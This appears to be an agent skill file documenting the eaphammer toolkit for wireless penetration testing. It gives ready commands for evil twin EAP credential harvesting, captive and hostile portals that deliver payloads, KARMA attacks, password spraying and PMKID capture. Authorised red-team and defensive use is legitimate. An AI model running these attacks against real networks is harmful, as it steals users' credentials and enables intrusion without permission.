---
name: eaphammer
description: Perform targeted evil twin attacks against WPA2-Enterprise and WPA2-PSK networks. Use for credential harvesting (EAP), captive portal attacks, KARMA attacks, and PMKID capture during wireless penetration testing and red team engagements.
---

# eaphammer

## Overview
A toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. It streamlines the process of setting up rogue access points, harvesting EAP credentials, and deploying captive portals with minimal manual configuration. Category: Wireless Attacks.

## Installation (if not already installed)
Assume eaphammer is already installed. If you encounter errors, install via:

```bash
sudo apt update && sudo apt install eaphammer
```

## Common Workflows

### Initial Setup (Certificate Generation)
Before running EAP attacks, you must generate or import certificates.
```bash
# Quick self-signed setup
eaphammer --bootstrap
```

### EAP Credential Harvesting (Evil Twin)
Target a specific WPA2-Enterprise network to steal usernames and MSCHAPv2 hashes.
```bash
eaphammer -i wlan0 -e "Target_Corporate_WiFi" --creds
```

### Captive Portal Attack
Force users to a portal to capture credentials or deliver payloads.
```bash
eaphammer -i wlan0 -e "Guest_WiFi" --captive-portal --portal-template /path/to/template
```

### KARMA Attack
Respond to all probe requests to lure clients into connecting.
```bash
eaphammer -i wlan0 --karma --essid-stripping
```

### EAP Password Spraying
Check for weak passwords across a list of users on a target ESSID.
```bash
eaphammer --eap-spray -e "Target_WiFi" --user-list users.txt --password "Password123" -I wlan0 wlan1
```

## Complete Command Reference

### General Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show basic help message |
| `--debug` | Enable debug output |

### Modes
| Flag | Description |
|------|-------------|
| `--cert-wizard [mode]` | Run Cert Wizard. Modes: `create`, `import`, `interactive`, `list`, `dh` |
| `--list-templates` | List available templates for the captive portal |
| `--create-template` | Create a template by cloning a login page |
| `--delete-template` | Delete a captive portal template |
| `--bootstrap` | Shorthand for `--cert-wizard create --self-signed` |
| `--creds`, `--brad` | Harvest EAP credentials using evil twin attack |
| `--pmkid` | Perform clientless attack against PSK network using hcxtools |
| `--eap-spray` | Check for password reuse by spraying a single password across usernames |
| `--hostile-portal` | Force clients to connect to hostile portal |
| `--captive-portal-server-only` | Run the captive portal server as a standalone service |
| `--captive-portal` | Force clients to connect to a captive portal |

### Access Point Configuration
| Flag | Description |
|------|-------------|
| `--lhost <IP>` | Your AP's IP address |
| `-i`, `--interface <iface>` | The physical interface for the AP |
| `-e`, `--essid <name>` | Specify access point ESSID |
| `-b`, `--bssid <MAC>` | Specify access point BSSID |
| `-c`, `--channel <num>` | Specify channel (default: 1) |
| `--hw-mode <mode>` | Hardware mode (g for 2.4GHz, a for 5GHz) |
| `--cloaking <type>` | SSID cloaking: `none`, `full`, `zeroes` |
| `--auth <type>` | Auth mechanism: `open`, `wpa-psk`, `wpa-eap`, `owe`, `owe-transition`, `owe-psk` |
| `--pmf <mode>` | Protected Management Frames: `disable`, `enable`, `require` |
| `--karma`, `--mana` | Enable KARMA mode |
| `--essid-stripping <char>` | Enable ESSID Stripping (e.g., `\r`, `\n`, `\t`, `\x20`) |
| `--mac-whitelist <file>` | Path to MAC whitelist file |
| `--mac-blacklist <file>` | Path to MAC blacklist file |
| `--ssid-whitelist <file>` | Path to SSID whitelist file |
| `--ssid-blacklist <file>` | Path to SSID blacklist file |

### Karma Options
| Flag | Description |
|------|-------------|
| `--loud`, `--singe` | Enable loud karma mode |
| `--known-beacons` | Enable persistent known beacons attack |
| `--known-ssids-file <file>` | Wordlist for known-beacons feature |
| `--known-ssids <list>` | Specify known SSIDs via CLI |

### 802.11n Options
| Flag | Description |
|------|-------------|
| `--channel-width <MHz>` | Set channel width (20 or 40 MHz) |

### WPA-PSK Options
| Flag | Description |
|------|-------------|
| `--wpa-passphrase <pass>` | Set WPA Passphrase for AP |

### WPA Options (PSK or EAP)
| Flag | Description |
|------|-------------|
| `--capture-wpa-handshakes <yes/no>` | Capture 4-way handshakes |
| `--psk-capture-file <path>` | Path to write handshake files |
| `--auth-alg <type>` | Auth type: `shared`, `open`, `both` |
| `--wpa-version <1/2>` | Set WPA version (default: 2) |

### OWE Transition Mode Options
| Flag | Description |
|------|-------------|
| `--transition-bssid <MAC>` | Set BSSID for OPEN AP |
| `--transition-ssid <name>` | Set SSID for OPEN AP |

### EAP Options
| Flag | Description |
|------|-------------|
| `--autocrack` | Enable autocrack 'n add |
| `--negotiate <mode>` | EAP approach: `balanced`, `speed`, `weakest`, `gtc-downgrade`, `manual` |
| `--wordlist <file>` | Wordlist for autocrack feature |
| `--remote-cracking-rig <S:P>` | Use remote cracking rig (server:port) |

### Template Management Options
| Flag | Description |
|------|-------------|
| `--name <name>` | Name of portal template module |
| `--description <desc>` | Description of portal template module |
| `--author <name>` | Author of portal template module |
| `--add-download-form` | Add a download form to captive portal |
| `--dl-form-message <msg>` | Specify download form text |

### Captive Portal Options
| Flag | Description |
|------|-------------|
| `--lport <port>` | Port for captive portal |
| `--payload <file>` | Specify payload name (default: payload.msi) |
| `--portal-template <dir>` | Specify template directory |

### Hostile Portal Options
| Flag | Description |
|------|-------------|
| `--pivot` | Runs responder without SMB server enabled |

### EAP Spray Options
| Flag | Description |
|------|-------------|
| `-I`, `--interface-pool <list>` | List of interfaces for password spray |
| `--user-list <file>` | File containing usernames |
| `--password <pass>` | Password to spray across users |

## Notes
- **Certificates**: You must run `--cert-wizard` or `--bootstrap` at least once before using `--creds`.
- **Hardware**: Requires a wireless adapter that supports AP mode and monitor mode.
- **Dependencies**: Relies on `dnsmasq`, `hostapd-wpe` (internal), and `responder`. Ensure these are not blocked by other processes like `NetworkManager`.